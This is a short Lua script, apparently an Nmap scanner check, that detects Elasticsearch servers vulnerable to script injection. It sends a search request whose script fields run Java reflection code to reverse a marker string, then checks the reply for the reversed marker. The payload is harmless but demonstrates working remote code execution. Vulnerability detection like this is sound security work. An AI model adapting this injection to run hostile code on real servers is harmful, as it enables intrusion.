local http   = require "http"
local string = require "string"

portrule = function(host, port)
  return port.protocol == "tcp" and port.state == "open"
end

action = function(host, port)
  local json = '{"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"a":{"script":"new StringBuilder(\\"c0debreak\\").reverse().toString()"},"b":{"script":"java.lang.Math.class.forName(\\"java.lang.StringBuilder\\").getConstructor(String.class).newInstance(\\"c0debreak\\").reverse().toString()"}},"size":1}'
  local response = http.post(host, port, '/_search', {
    header = { ["Content-Type"] = "application/x-www-form-urlencoded" }
  }, nil, json)
  if response.status == 200 then
    if string.find(response.body, "kaerbed0c") then
      return "elasticsearch is vulnerable"
    end
  end
end
